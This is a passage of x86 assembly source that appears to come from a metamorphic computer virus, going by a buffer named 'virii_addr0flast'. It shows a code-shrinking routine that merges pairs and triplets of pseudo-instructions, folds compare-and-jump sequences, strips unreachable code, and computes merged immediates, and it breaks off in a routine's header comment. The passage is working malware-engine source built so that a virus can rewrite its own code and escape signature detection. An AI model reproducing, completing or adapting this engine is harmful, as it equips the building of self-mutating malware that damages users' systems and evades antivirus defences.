                              mov       ebx, 0E4h    ; NOT Reg + NEG Reg?
                              xor       ecx, ecx
                              mov       edx, 1       ; Set ADD Reg,1
Double_Next_Check_NOT_OP:
                              xor       eax, eax
                              mov       al, [edi]
                              cmp       eax, ebx ; 0E4h
                              jz        Double_Next17_ADDReg ; Check NOT/NEG + ADD,1/-1
                              cmp       eax, ecx ; 00h
                              jnz       Double_End
Double_Next17_NEGReg:
                              mov       eax, [esi+1]
                              cmp       al, [edi+1]
                              jnz       Double_End
Double_Next17_NEGReg_2:
                              test      ebx, 2
                              jz        Double_Next17_Get32
                              xor       eax, eax
                              mov       al, [edi+7]
                              cmp       eax, 80h
                              jb        Double_Next17_Cont00
                              add       eax, 0FFFFFF00h
                              jmp       Double_Next17_Cont00
Double_Next17_Get32:
                              mov       eax, [edi+7]
Double_Next17_Cont00:
                              cmp       eax, edx
                              jnz       Double_End
                              mov       eax, ebx  ; NEG
                              jmp       Double_Next_SetInstruction
Double_Next17_ADDReg:
                              mov       eax, [esi+1]
                              cmp       al, [edi+1]
                              jnz       Double_End
Double_Next17_ADDReg_2:
                              mov       eax, edx
                              mov       [esi+7], eax
                              mov       eax, ecx
                              jmp       Double_Next_SetInstruction

Double_Next18:
                              ;mov      al, [esi]
                              cmp       eax, 0E2h  ; Check NOT Reg8 + NEG Reg8/ADD Reg8,1
                              jnz       Double_Next19
                              mov       ebx, 0E6h
                              mov       ecx, 80h
                              mov       edx, 1     ; If so, set ADD Reg8,1/NEG Reg8
                              jmp       Double_Next_Check_NOT_OP

Double_Next19:
                              ;mov      al, [esi]
                              cmp       eax, 0E4h  ; NEG Reg + NOT Reg/ADD Reg,-1?
                              jnz       Double_Next20
                              mov       ebx, 0E0h
                              xor       ecx, ecx
                              mov       edx, -1    ; If so, set ADD Reg,-1/NOT Reg
                              jmp       Double_Next_Check_NOT_OP

Double_Next20:
                              ;mov      al, [esi]
                              cmp       eax, 0E6h  ; NEG Reg8 + NOT Reg8/ADD Reg8,-1?
                              jnz       Double_Next21
                              mov       ebx, 0E2h
                              mov       ecx, 80h
                              mov       edx, -1    ; Set ADD Reg8,-1/NOT Reg8
                              jmp       Double_Next_Check_NOT_OP

Double_Next21:
                              cmp       eax, 0E1h  ; NOT Mem + NEG Mem/ADD Mem,1?
                              jnz       Double_Next22
                              mov       ebx, 0E5h
                              mov       ecx, 4
                              mov       edx, 1     ; Then, set ADD Mem,1/NEG Mem
Double_Next_Check_NOT_OP_Mem:
                              xor       eax, eax
                              mov       al, [edi]
                              cmp       eax, ebx
                              jz        Double_Next21_ADDMem
                              cmp       eax, ecx
                              jnz       Double_End
Double_Next21_NEGMem:
                              mov       eax, [esi+1] ; Check if operands are the same
                              cmp       eax, [edi+1]
                              jnz       Double_End
                              mov       eax, [esi+3]
                              cmp       eax, [edi+3]
                              jnz       Double_End
                              xor       eax, eax
                              jmp       Double_Next17_NEGReg_2
Double_Next21_ADDMem:
                              mov       eax, [esi+1]  ; Check NOT/NEG + ADD,1/-1
                              cmp       eax, [edi+1]
                              jnz       Double_End
                              mov       eax, [esi+3]
                              cmp       eax, [edi+3]
                              jnz       Double_End
                              xor       eax, eax
                              jmp       Double_Next17_ADDReg_2

Double_Next22:
                              cmp       eax, 0E3h     ; NOT Mem8 + NEG Mem8/ADD Mem,1?
                              jnz       Double_Next23
                              mov       ebx, 0E7h
                              mov       ecx, 84h
                              mov       edx, 1        ; Set ADD Mem8,1/NEG Mem8
                              jmp       Double_Next_Check_NOT_OP_Mem

Double_Next23:
                              cmp       eax, 0E5h     ; NEG Mem + NOT Mem/ADD Mem,-1?
                              jnz       Double_Next24
                              mov       ebx, 0E1h
                              mov       ecx, 4
                              mov       edx, -1       ; Set ADD Mem,-1/NOT Mem
                              jmp       Double_Next_Check_NOT_OP_Mem

Double_Next24:
                              cmp       eax, 0E7h     ; NEG Mem8 + NOT Mem8/ADD Mem8,-1?
                              jnz       Double_Next25
                              mov       ebx, 0E3h
                              mov       ecx, 84h
                              mov       edx, -1       ; Set ADD Mem8,-1/NOT Mem8
                              jmp       Double_Next_Check_NOT_OP_Mem


; Next four conditions are also disabled. They would work theorically, but they
; don't in practice :/
Double_Next25:
            ;                 cmp         eax, 38h
            ;                 jb          Double_Next26
            ;                 cmp         eax, 3Ch
            ;                 ja          Double_Next26
;Double_Next_CheckComparision:
            ;                 mov         al, [edi]
            ;                 cmp         eax, 70h
            ;                 jb          Double_Next_NoComparision
            ;                 cmp         eax, 7Fh
            ;                 jbe         Double_End
;Double_Next_NoComparision:
            ;                 jmp         Double_Next_SetNOPAt1st

Double_Next26:
            ;                 ;mov        al, [esi]
            ;                 cmp         eax, 38h+80h
            ;                 jb          Double_Next27
            ;                 cmp         eax, 3Ch+80h
            ;                 jbe         Double_Next_CheckComparision

Double_Next27:
            ;                 ;mov        al, [esi]
            ;                 cmp         eax, 48h
            ;                 jb          Double_Next28
            ;                 cmp         eax, 4Ch
            ;                 jbe         Double_Next_CheckComparision

Double_Next28:
            ;                 ;mov        al, [esi]
            ;                 cmp         eax, 48h+80h
            ;                 jb          Double_Next29
            ;                 cmp         eax, 4Ch+80h
            ;                 jbe         Double_Next_CheckComparision

Double_Next29:
                              cmp       eax, 0EAh   ; CALL Mem + MOV Mem,EAX?
                              jnz       Double_Next30
Double_Next29_CheckAPICALL_STORE:
                              mov       al, [edi]
                              cmp       eax, 43h
                              jnz       Double_End
                              mov       al, [edi+7] ; Check EAX
                              or        eax, eax
                              jnz       Double_End
                              mov       eax, 0F6h
                              mov       [edi], al   ; Set APICALL_STORE
                              xor       eax, eax
                              mov       [edi+7], eax  ; If we put 0 here we can treat this as
                              jmp       EndCompressed ; an special opcode 43h (MOV Mem,Reg)

Double_Next30:
                              cmp       eax, 0ECh   ; Check CALL Reg + MOV Mem,EAX?
                              jz        Double_Next29_CheckAPICALL_STORE ; Check APICALL_STORE

Double_Next31:
                              cmp       eax, 42h    ; MOV Reg,Mem?
                              jnz       Double_Next32
                              mov       eax, [edi]
                              and       eax, 0FFh
                              cmp       eax, 20h    ; MOV Reg,Mem + AND Reg,0FF?
                              jz        Double_Next31_MaybeMOVZX ; Set MOVZX
                              mov       al, [esi+7]
                              cmp       eax, 2      ; EAX,ECX,EDX? (it only uses these three)
                              ja        Double_Next32
                              cmp       al, [edi+1]
                              jnz       Double_Next32
                              mov       al, [edi]
                              cmp       eax, 0ECh   ; CALL Reg?
                              jnz       Double_Next32
                              sub       eax, 2      ; MOV Reg,Mem + CALL Reg = CALL Mem
                              jmp       Double_Next_SetInstruction
Double_Next31_MaybeMOVZX:
                              mov       eax, [edi+7] ; Check MOVZX. We check if the destiny
                              cmp       eax, 0FFh    ; registers are the same one
                              jnz       Double_Next32
                              mov       eax, [esi+7]
                              and       eax, 0FFh
                              mov       ebx, [edi+1]
                              and       ebx, 0FFh
                              cmp       eax, ebx
                              jnz       Double_Next32
                              mov       eax, [esi+1]
                              and       eax, 0FFh    ; AND Reg,0FF?
                              cmp       eax, ebx
                              jz        Double_Next32
                              mov       eax, [esi+2]
                              and       eax, 0Fh     ; Set the register
                              cmp       eax, ebx
                              jz        Double_Next32
                              mov       eax, 0F8h    ; Set MOVZX Reg,byte ptr Mem
                              jmp       Double_Next_SetInstruction


Double_Next32:
                              xor       eax, eax
                              mov       al, [esi]
                              cmp       eax, 39h     ; CMP Reg,Reg?
                              jnz       Double_Next33
Double_Next32_Common:
                              mov       al, [edi]
                              cmp       eax, 70h     ; CMP Reg,Reg + Jcc @xxx?
                              jb        Double_End
                              cmp       eax, 7Fh
                              ja        Double_End
                              mov       al, [esi+1]
                              mov       ebx, eax     ; If source and destiny in CMP aren't
                              mov       al, [esi+7]  ; the same, it's not a camuflated JMP
                              cmp       eax, ebx
                              jnz       Double_End

                              mov       eax, [edi]   ; Check flags when we jump for sure
                              and       eax, 07h     ; and when the two instructions do
                              cmp       eax, 1       ; nothing.
                              jz        Double_Next32_JMP
                              cmp       eax, 6
                              jz        Double_Next32_JMP
                              mov       eax, [edi]
                              and       eax, 0Fh
                              cmp       eax, 2
                              jbe       Double_Next32_NOP
                              cmp       eax, 4
                              jbe       Double_Next32_JMP
                              cmp       eax, 0Ah
                              jz        Double_Next32_JMP
                              cmp       eax, 0Dh
                              jz        Double_Next32_JMP
Double_Next32_NOP:
                              mov       eax, 0FFh   ; Set NOP in JO,JB,JNZ,JA,JS,JNP,JL,JG
                              mov       [edi], eax
                              jmp       EndCompressed
Double_Next32_JMP:
                              mov       eax, 0E9h   ; Set JMP in JNO,JAE,JZ,JBE,JNS,JP,JGE,JLE
                              mov       [edi], al
                              mov       edx, edi
 ; After the jump, we eliminate all the instructions until the next labelled
 ; instruction. That instructions are never executed, so we NOP them to avoid
 ; its reassembly.
Double_Next32_EliminateNonReachableCode:
                              add       edx, 10h
                              cmp       edx, [ebp+virii_addr0flast]
                              jae       EndCompressed
                              mov       al, [edx+0Bh]  ; Check label mark
                              or        eax, eax
                              jnz       EndCompressed
                              mov       eax, 0FFh
                              mov       [edx], eax
                              jmp       Double_Next32_EliminateNonReachableCode


Double_Next33:
                              cmp       eax, 39h+80h   ; Do the same with CMP Reg8,Reg8
                              jz        Double_Next32_Common

Double_End:


 ;; Here we check triplets of instructions and merge them into one.
Check_Triple:
                              mov       edx, esi
                              mov       esi, edi
                              call      IncreaseEIP
                              cmp       edi, [ebp+virii_addr0flast]
                              jz        EndNoCompressed
                              xor       eax, eax
                              mov       al, [edi+0Bh]
                              or        eax, eax
                              jnz       EndNoCompressed ; No compress if a label is pointing
                                                      ; the last instruction
                              ; Check triplet in [edx],[esi],[edi]

Triple_Next00:
                              ;xor      eax, eax
                              mov       al, [edx]
                              cmp       eax, 43h       ; MOV Mem,Reg?
                              jnz       Triple_Next01
                              mov       eax, [edx+1]   ; Check mem operands
                              cmp       eax, [esi+1]
                              jnz       Triple_Next01
                              mov       eax, [edx+3]
                              cmp       eax, [esi+3]
                              jnz       Triple_Next01
                              mov       eax, [edi]
                              cmp       al, 42h        ; 3rd instruction == MOV Reg,Mem?
                              jz        Triple_Next00_Constr00
                              cmp       al, 70h        ; 3rd instr. == Jcc?
                              jb        Triple_Next01
                              cmp       al, 7Fh
                              ja        Triple_Next01
                              mov       eax, [esi]
                              and       eax, 0F8h      ; Get the comparision
                              or        eax, eax
                              jz        Triple_Next00_Maybe01
                              cmp       eax, 28h       ; SUB?
                              jz        Triple_Next00_Maybe01
                              cmp       eax, 38h       ; CMP?
                              jz        Triple_Next00_Maybe01
                              cmp       eax, 48h       ; TEST?
                              jz        Triple_Next00_Maybe01
                              cmp       eax, 20h       ; AND?
                              jnz       Triple_End
Triple_Next00_Maybe01:
                              xor       ebx, ebx
Triple_Next00_CheckCMPTEST:
                              mov       eax, [esi]     ; Get the operation being performed
                              and       eax, 07Fh
                              cmp       eax, 48h       ; If test, jump
                              jb        Triple_Next00_CheckCMPTEST_00
                              and       eax, 7
                              cmp       eax, 2         ; Check if it's OP Reg,Mem
                              jz        Triple_Next00_CMPTESTRegReg
                              jmp       Triple_Next00_CheckCMPTEST_01
Triple_Next00_CheckCMPTEST_00:
                              and       eax, 7
                              cmp       eax, 3         ; Check if it's OP Mem,Reg
                              jz        Triple_Next00_CMPTESTRegReg
Triple_Next00_CheckCMPTEST_01:
                              cmp       eax, 4         ; Check if it's OP Mem,Imm
                              jnz       Triple_End
Triple_Next00_CMPTESTRegImm:
                              mov       eax, [edx+7]
                              mov       [esi+1], al    ; Set CMP/TEST Reg,Imm
                              ;xor      ebx, ebx
Triple_Next00_SET_CMPTEST:
                              mov       eax, [esi]
                              and       eax, 78h
                              cmp       eax, 48h       ; Check TEST
                              jz        Triple_Next00_SetInstruction
                              cmp       eax, 20h       ; Check AND
                              jz        Triple_Next00_Cont80
                              cmp       eax, 38h       ; Check CMP
                              jz        Triple_Next00_SetInstruction
                              or        eax, eax       ; Check ADD (maybe is a conversion
                              jz        Triple_Next00_NegateImm  ; of SUB Reg,Imm)
Triple_Next00_SetCMP:
                              mov       eax, 38h       ; Set CMP if it's SUB/CMP
                              jmp       Triple_Next00_SetInstruction
Triple_Next00_NegateImm:
                              mov       eax, [esi+7]
                              neg       eax           ; If it's ADD is because I converted the
                              mov       [esi+7], eax  ; SUB as a single instruction before
                              jmp       Triple_Next00_SetCMP
Triple_Next00_Cont80:
                              mov       eax, 48h      ; Set TEST if it's TEST/AND
Triple_Next00_SetInstruction:
                              add       eax, ebx
                              mov       [esi], al
                              mov       eax, 0FFh
                              mov       [edx], al
                              jmp       EndCompressed
Triple_Next00_CMPTESTRegReg:
                              mov       eax, [esi]
                              and       eax, 78h
                              or        eax, eax     ; ADD?
                              jz        Triple_End   ; If so, finish
                              mov       eax, [esi+7]
                              mov       [esi+1], al
                              mov       eax, [edx+7]
                              mov       [esi+7], al
                              add       ebx, 1
                              jmp       Triple_Next00_SET_CMPTEST
Triple_Next00_Constr00:
                              mov       eax, [esi]
                              cmp       al, 4Ch      ; Common OP?
                              ja        Triple_Next01
                              xor       ebx, ebx
Triple_Next00_Common:
                              mov       eax, [esi]
                              and       eax, 78h     ; Get instruction
                              cmp       eax, 48h     ; If it's not TEST, finish
                              jb        Triple_Next00_Common_00
                              mov       eax, [esi]
                              and       eax, 7
                              cmp       eax, 2       ; Check TEST Reg,Mem
                              jz        Triple_Next00_Maybe00
                              jmp       Triple_Next00_Common_01
Triple_Next00_Common_00:
                              mov       eax, [esi]
                              and       al, 7
                              cmp       al, 3        ; Check OP Mem,Reg
                              jz        Triple_Next00_Maybe00
Triple_Next00_Common_01:
                              cmp       al, 4        ; Check OP Mem,Imm
                              jnz       Triple_End
Triple_Next00_Maybe00:
                              mov       eax, [edx+1]       ; Check the Mem operand among the
                              cmp       eax, [esi+1]       ; instructions
                              jnz       Triple_End
                              cmp       eax, [edi+1]
                              jnz       Triple_End
                              mov       eax, [edx+3]
                              cmp       eax, [esi+3]
                              jnz       Triple_End
                              cmp       eax, [edi+3]
                              jnz       Triple_End
                              mov       eax, [edx+7]
                              cmp       al, [edi+7]
                              jnz       Triple_End
                              mov       eax, [esi]
                              and       eax, 78h
                              cmp       eax, 48h           ; Get if it's TEST
                              jb        Triple_Next00_00
                              mov       eax, [esi]
                              and       eax, 7             ; Check TEST Reg,Mem
                              cmp       eax, 2
                              jz        Triple_Next00_Maybe_OPRegReg ; Jump here if it is
                              jmp       Triple_Next00_01
Triple_Next00_00:
                              mov       eax, [esi]
                              and       eax, 7             ; Check OP Mem,Reg
                              cmp       eax, 3
                              jz        Triple_Next00_Maybe_OPRegReg
Triple_Next00_01:
                              mov       eax, [edx+7]
                              mov       [edx+1], al
                              mov       eax, [esi+7]
                              mov       [edx+7], eax
                              mov       eax, [esi]
                              and       eax, 78h
                              add       eax, ebx      ; Set the instruction with the EBX
Triple_Next_SetInstruction: ; operands type (Reg,Imm, Reg,Reg, etc.)
                              mov       [edx], al
Triple_Next_SetNOP:
                              mov       eax, 0FFh
                              mov       [esi], al
                              mov       [edi], al    ; Eliminate the 2nd and 3rd instruction
                              jmp       EndCompressed
Triple_Next00_Maybe_OPRegReg:
                              mov       eax, [esi+7]
                              mov       [edx+1], eax
                              mov       eax, [edi+7]
                              mov       [edx+7], eax
                              mov       eax, [esi]
                              and       eax, 0F8h    ; Set CMP/TEST Reg,Reg
                              add       eax, 1
                              jmp       Triple_Next_SetInstruction


Triple_Next01:
                              mov       eax, [edx]
                              cmp       al, 43h+80h    ; Check the same as above, but this
                              jnz       Triple_Next02  ; time with 8 bits instructions. Since
                              mov       eax, [edx+1]   ; there are many different opcodes,
                              cmp       eax, [esi+1]   ; it's not worthy to try to merge it
                              jnz       Triple_Next02  ; with the routine above, but all the
                              mov       eax, [edx+3]   ; others that check the possibility of
                              cmp       eax, [esi+3]   ; compression are from there, linking
                              jnz       Triple_Next02  ; the possibilities with Jccs.
                              mov       eax, [edi]
                              cmp       al, 42h+80h
                              jz        Triple_Next01_Constr00
                              cmp       al, 70h
                              jb        Triple_Next02
                              cmp       al, 7Fh
                              ja        Triple_Next02
                              mov       eax, [esi]
                              and       eax, 0F8h
                              cmp       eax, 00h+80h
                              jz        Triple_Next01_Maybe01
                              cmp       eax, 28h+80h
                              jz        Triple_Next01_Maybe01
                              cmp       eax, 38h+80h
                              jz        Triple_Next01_Maybe01
                              cmp       eax, 48h+80h
                              jz        Triple_Next01_Maybe01
                              cmp       eax, 20h+80h
                              jnz       Triple_End
Triple_Next01_Maybe01:
                              mov       ebx, 80h
                              jmp       Triple_Next00_CheckCMPTEST
Triple_Next01_Constr00:
                              mov       ebx, 80h
                              mov       eax, [esi]
                              cmp       al, 4Ch+80h
                              ja        Triple_Next02     ; Well, at least we achieved to
                              cmp       al, 00h+80h       ; use as many instructions from the
                              jae       Triple_Next00_Common ; @@Triple_Next00 as we can :)


Triple_Next02:
                              mov       eax, [edx]
                              cmp       al, 4Fh           ; MOV Mem,Mem?
                              jnz       Triple_Next03
                              mov       eax, [edi]
                              cmp       al, 70h           ; Jcc in 3rd?
                              jb        Triple_Next02_ContCheck
                              cmp       al, 7Fh
                              ja        Triple_Next02_ContCheck
                              mov       ebx, [edx+7]      ; Get the destiny address and check
                              mov       eax, [ebx+1]      ; if first and second instruction
                              cmp       eax, [esi+1]      ; use the same operand.
                              jnz       Triple_End
                              mov       eax, [ebx+3]
                              cmp       eax, [esi+3]
                              jnz       Triple_End
                              mov       eax, [esi]
                              and       eax, 78h          ; Check for comparisions:
                              cmp       eax, 20h          ; AND?
                              jz        Triple_Next02_CheckCMPTESTMemReg
                              cmp       eax, 28h          ; SUB?
                              jz        Triple_Next02_CheckCMPTESTMemReg
                              cmp       eax, 38h          ; CMP?
                              jz        Triple_Next02_CheckCMPTESTMemReg
                              cmp       eax, 48h          ; TEST?
                              jnz       Triple_Next03
Triple_Next02_CheckCMPTESTRegMem:
Triple_Next02_CheckCMPTESTMemReg:
                              mov       eax, [edx+1]
                              mov       [esi+1], eax
                              mov       eax, [edx+3]
                              mov       [esi+3], eax
                              mov       eax, 0FFh
                              mov       [edx], eax
                              mov       eax, [esi]
                              and       eax, 78h
                              cmp       eax, 38h          ; CMP?
                              jz        EndCompressed
                              cmp       eax, 48h          ; TEST?
                              jz        EndCompressed
                              cmp       eax, 20h          ; AND?
                              jz        Triple_Next02_SetTEST
                              mov       ebx, 10h          ; Transform from SUB to CMP
Triple_Next02_ConvertInstruction:
                              mov       eax, [esi]        ; Set the instruction
                              add       eax, ebx
                              mov       [esi], eax
                              jmp       EndCompressed
Triple_Next02_SetTEST:
                              mov       ebx, 28h          ; Transform from AND to TEST
                              jmp       Triple_Next02_ConvertInstruction
Triple_Next02_ContCheck:
                              ;mov      al, [edi]
                              cmp       al, 4Fh           ; Check the 3rd instruction for a
                              jnz       Triple_Next03     ; common operation
                              mov       eax, [esi]
                              cmp       al, 4Ch           ; Check now the 2nd instruction
                              jbe       Triple_Next02_CommonOperation
                              cmp       al, 00h+80h       ; Check if it's 8 bits instructions
                              jb        Triple_Next03
                              cmp       al, 4Ch+80h
                              ja        Triple_Next03
Triple_Next02_CommonOperation:
                              cmp       eax, 0F6h         ; Check for APICALL_STORE
                              jz        Triple_Next02_OPMemReg
                              and       eax, 78h
                              cmp       eax, 48h          ; Check for a common instruction
                              jb        Triple_Next02_00
                              mov       eax, [esi]
                              and       eax, 7
                              cmp       eax, 2            ; Check if it's OP Reg,Mem in 2nd
                              jz        Triple_Next02_OPMemReg
                              jmp       Triple_Next02_01
Triple_Next02_00:
                              mov       eax, [esi]
                              and       eax, 7
                              cmp       eax, 3            ; Check if it's OP Mem,Reg in 2nd
                              jz        Triple_Next02_OPMemReg
Triple_Next02_01:
                              cmp       eax, 4            ; OP Mem,Imm?
                              jnz       Triple_End
Triple_Next02_OPMemImm:
Triple_Next02_OPMemReg:
                              mov       ebx, [edx+7]
                              mov       eax, [ebx+1]
                              cmp       eax, [edi+1]      ; Check Mem operands to see if the
                              jnz       Triple_End        ; instructions use the same one (if
                              cmp       eax, [esi+1]      ; not, we can't compress them,
                              jnz       Triple_End        ; obviously)
                              mov       eax, [ebx+3]
                              cmp       eax, [edi+3]
                              jnz       Triple_End
                              cmp       eax, [esi+3]
                              jnz       Triple_End
                              mov       ebx, [edi+7]
                              mov       eax, [ebx+1]
                              cmp       eax, [edx+1]
                              jnz       Triple_End
                              mov       eax, [ebx+3]
                              cmp       eax, [edx+3]
                              jnz       Triple_End
                              mov       eax, [edx+1]      ; Set the new Mem operand
                              mov       [esi+1], eax
                              mov       eax, [edx+3]
                              mov       [esi+3], eax
Triple_Next_SetNOP_1_3:
                              mov       eax, 0FFh
                              mov       [edx], al
                              mov       [edi], al         ; Overwrite with NOP the first and
                              jmp       EndCompressed     ; third instruction, since we used
                                                      ; the second one to put the new
                                                      ; instruction.
Triple_Next03:
                              mov       eax, [edx]
                              cmp       al, 44h           ; Check for MOV Mem,Imm
                              jnz       Triple_Next04
                              mov       eax, [edi]
                              cmp       al, 42h           ; MOV Mem,Imm + xxx + MOV Reg,Mem?
                              jz        Triple_Next03_Constr00
                              cmp       al, 70h           ; Jcc in 3rd?
                              jb        Triple_Next04
                              cmp       al, 7Fh
                              ja        Triple_Next04
                              mov       eax, [esi]
Triple_Next03_Check_CMP_TEST:
                              cmp       al, 3Ah           ; CMP Reg,Mem (8 or 32 bits)
                              jz        Triple_Next03_CMPRegImm
                              cmp       al, 4Ah           ; TEST Reg,Mem (" " " ")
                              jnz       Triple_End
Triple_Next03_CMPRegImm:
Triple_Next03_TESTRegImm:
                              mov       eax, [esi]        ; Get 2nd instruction
                              and       eax, 0F8h         ; Convert it to OP Reg,Imm
                              mov       [edx], al         ; Set it at 1st instruction
                              mov       eax, [esi+7]
                              mov       [edx+1], al
                              mov       eax, 0FFh
                              mov       [esi], al
                              jmp       EndCompressed
Triple_Next03_Constr00:
                              mov       eax, [esi]
                              cmp       eax, 0F6h         ; Check if it's APICALL_STORE
                              jz        Triple_Next03_Common_F6
                              cmp       al, 4Ch           ; Check if it's a common operation
                              ja        Triple_Next04
Triple_Next03_Common:
                              and       eax, 78h
                              cmp       eax, 48h          ; Common operation?
                              jb        Triple_Next03_00
                              mov       eax, [esi]
                              and       eax, 7
                              cmp       eax, 2            ; Check if it's OP Reg,Mem
                              jz        Triple_Next03_Common_F6
                              jmp       Triple_End
Triple_Next03_00:
                              mov       eax, [esi]
                              and       eax, 7
                              cmp       eax, 3            ; OP Mem,Reg?
                              jnz       Triple_End
Triple_Next03_Common_F6:
                              mov       eax, [edx+1]      ; If the Mem operands are the same,
                              cmp       eax, [esi+1]      ; merge them
                              jnz       Triple_End
                              cmp       eax, [edi+1]
                              jnz       Triple_End
                              mov       eax, [edx+3]
                              cmp       eax, [esi+3]
                              jnz       Triple_End
                              cmp       eax, [edi+3]
                              jnz       Triple_End
                              mov       eax, [esi+7]
                              mov       [edx+1], eax
                              mov       eax, [esi]
                              and       eax, 0F8h
                              jmp       Triple_Next_SetInstruction


Triple_Next04:
                              mov         eax, [edx]
                              cmp         al, 44h+80h    ; Same as above, but 8 bits instructs.
                              jnz         Triple__Next04
                              mov         eax, [edi]
                              cmp         al, 42h+80h
                              jz          Triple_Next04_Constr00
                              cmp         al, 70h
                              jb          Triple__Next04
                              cmp         al, 7Fh
                              ja          Triple__Next04
                              mov         eax, [esi]
                              sub         al, 80h
                              jmp         Triple_Next03_Check_CMP_TEST
Triple_Next04_Constr00:
                              mov         eax, [esi]
                              cmp         al, 00h+80h
                              jb          Triple__Next04
                              cmp         al, 4Ch+80h
                              jbe         Triple_Next03_Common

Triple__Next04:


Triple_End:
                	            jmp         EndNoCompressed  ; If we didn't found any single,
                                         ; pair or triplet, end with flag of
EndCompressed:                           ; "not found"
                              mov         eax, 1
                              pop         edi
                              ret
EndNoCompressed:
                              xor         eax, eax
                              pop         edi
                              ret
ShrinkThisInstructions endp


;; This routine checks if the pseudoopcode passed uses a memory operand,
;; returning EAX = 1 if uses it, or 0 if it doesn't
CheckIfInstructionUsesMem proc
                              cmp       eax, 4Eh  ; Common op?
                              jbe       Common
                              cmp       eax, 4Fh  ; MOV Mem,Mem --> return TRUE
                              jz        UsesMem
                              cmp       eax, 70h  ; If 50/51/58/59 --> return bit 0
                              jb        CheckLastBit
                              cmp       eax, 80h  ; Common 8 bits operations?
                              jb        NoMem
                              cmp       eax, 0CEh
                              jbe       Common
                              cmp       eax, 0E7h ; From E0 to E7 (NOT/NEG) -> return bit 0
                              jbe       CheckLastBit
                              cmp       eax, 0EAh ; CALL Mem?
                              jz        UsesMem
                              cmp       eax, 0EBh ; JMP Mem?
                              jz        UsesMem
                              cmp       eax, 0F1h ; SHIFT Mem?
                              jz        UsesMem
                              cmp       eax, 0F3h ; SHIFT Mem8?
                              jz        UsesMem
                              cmp       eax, 0F6h ; APICALL_STORE?
                              jz        UsesMem
                              cmp       eax, 0F7h
                              jz        UsesMem
                              cmp       eax, 0F8h ; MOVZX Reg,byte ptr [Mem]?
                              jz        UsesMem
                              cmp       eax, 0FCh ; LEA?
                              jz        UsesMem
NoMem:                        xor       eax, eax  ; Return FALSE
                              ret
CheckLastBit:
                              and       eax, 1    ; Return bit 0
                              ret
Common:
                              cmp       eax, 4Eh  ; Temporal info-transferring opcode
                              jz        UsesMem
                              and       eax, 7
                              cmp       eax, 2
                              jb        NoMem
                              cmp       eax, 4    ; OP Reg,Mem / OP Mem,Reg / OP Mem,Imm?
                              ja        NoMem     ; If not, return FALSE
UsesMem:
                              mov       eax, 1
                              ret
CheckIfInstructionUsesMem endp

;; This function merges the Imms passed in ECX and EDX depending on the
;; operations passed in EBX and EAX. The return values are the result of
;; merging the operations. For example, if we pass MOV EAX,1234 / ADD EAX,5
;; then the returned operation will be MOV EAX,1239. It's also made for
;; ADD + ADD/SUB and many more. If the operation can't be joined then the
;; return value is 0FEh. If there are no merging, but the first instruction
;; does nothing (for example, ADD EAX,1234 / MOV EAX,5 --> MOV EAX,5) then
;; the return value is NOP.
; In:
;; ECX = First Imm
;; EDX = 2nd Imm
;; EAX = First OP
;; EBX = 2nd OP (in lower 8 bits)
; Out:
;; ECX = Value to OP
;; EAX = OP to perform
;;      FEh if it isn't shrinkable.
;;      FFh if we must eliminate 1st instruction and leave 2nd invariable.
CalculateOperation proc
;; ADC & SBB aren't treated since they aren't used by the engine.
                              and       ebx, 0FFh
                              and       eax, 0FFh
                              cmp       ebx, 40h   ; If 2nd instruction is MOV, eliminate 1st
                              jz        Eliminate1st
                              cmp       eax, 40h   ; First instruction == MOV?
                              jz        @@MOV        ; Then, do the merge
                              or        eax, eax   ; ADD?
                              jz        @@ADD
                              cmp       eax, 8     ; OR?
                              jz        @@OR
                              cmp        eax, 20h   ; AND?
                              jz        @@AND
                              cmp       eax, 28h   ; SUB?
                              jz        @@SUB
                              cmp       eax, 30h   ; XOR?
                              jz        @@XOR
                              cmp       eax, 38h   ; CMP
                              jz        Eliminate1st
                              cmp       eax, 48h   ; TEST
                              jnz       Eliminate1st
                              jmp       NoCompression

     ; Check a merging with the ADD as first instruction
                @@ADD:        or        ebx, ebx  ; 2nd instr. ADD?
                              jz        ADD_ADD   ; Then, merge
                              cmp       ebx, 28h  ; 2nd instr. SUB?
                              jz        ADD_SUB   ; Then, merge
                              jmp       NoCompression  ; Exit with no compression

     ; Try the merging with OR
                  @@OR:       cmp       ebx, 8    ; 2nd instruction == OR?
                              jz        OR_OR     ; Merge OR / OR
                              jmp       NoCompression  ; Exit with no compression

                 @@AND:      cmp        ebx, 20h  ; Check AND / AND
                             jz         AND_AND   ; If it is, merge ANDs
                             jmp        NoCompression  ; Exit with no compression

                 @@SUB:      or         ebx, ebx  ; Check SUB / ADD or SUB / SUB
                             jz         SUB_ADD
                             cmp        ebx, 28h
                             jnz        NoCompression  ; Exit with no compression
                 SUB_SUB:    neg        ecx       ; Merge the SUBs into a single operation:
                             sub        ecx, edx  ; -(1st) - 2nd = ADD Imm
                             xor        eax, eax
                             ret
                  SUB_ADD:   sub        edx, ecx  ; 2nd - 1st = ADD Imm
                             mov       ecx, edx
                             xor       eax, eax
                             ret

        @@XOR:               cmp       ebx, 30h  ; XOR / XOR?
                             jz        XOR_XOR   ; Then merge XORs
                             jmp       NoCompression ; If it's not XOR, don't merge

        @@MOV:               or        ebx, ebx  ; MOV / ADD?
                             jz        MOV_ADD
                             cmp       ebx, 8    ; MOV / OR?
                             jz        MOV_OR
                             cmp       ebx, 20h  ; MOV / AND?
                             jz        MOV_AND
                             cmp       ebx, 28h  ; MOV / SUB?
                             jz        MOV_SUB
                             cmp       ebx, 30h  ; MOV / XOR?
                             jz        MOV_XOR
NoCompression:
                             mov       eax, 0FEh ; Set "no compression" return value
                             ret
Eliminate1st:
                             mov       eax, 0FFh ; Set NOP to first instruction (and leave the
                             ret               ; second instruction untouched)

ADD_ADD:
MOV_ADD:                     add       ecx, edx  ; MOV + ADD or ADD + ADD = Add both Imms
                             ret
OR_OR:                     ; MOV + OR or OR + OR = OR both Imms
MOV_OR:                      or        ecx, edx
                             ret
AND_AND:                   ; MOV + AND or AND + AND = AND both Imms
MOV_AND:                     and       ecx, edx
                             ret
ADD_SUB:                   ; MOV + SUB or ADD + SUB = SUB 2nd Imm from
MOV_SUB:                     sub       ecx, edx  ; first Imm
                             ret
XOR_XOR:                   ; MOV + XOR or XOR + XOR = XOR both Imms
MOV_XOR:                     xor       ecx, edx
                             ret
CalculateOperation endp

;; This function merges two flag checks (like JNZ/JA, for example) to get a
;; direct check to use in a conditional jump.
;; In:
;;  EAX = Flag to check 1
;;  EBX = Flag to check 2
;; Out:
;;  EAX = Direct flag (+70h = 7xh, opcode of Jcc)
;;      = 79h if unconditional jump is performed (+70h = E9h, opcode of JMP)
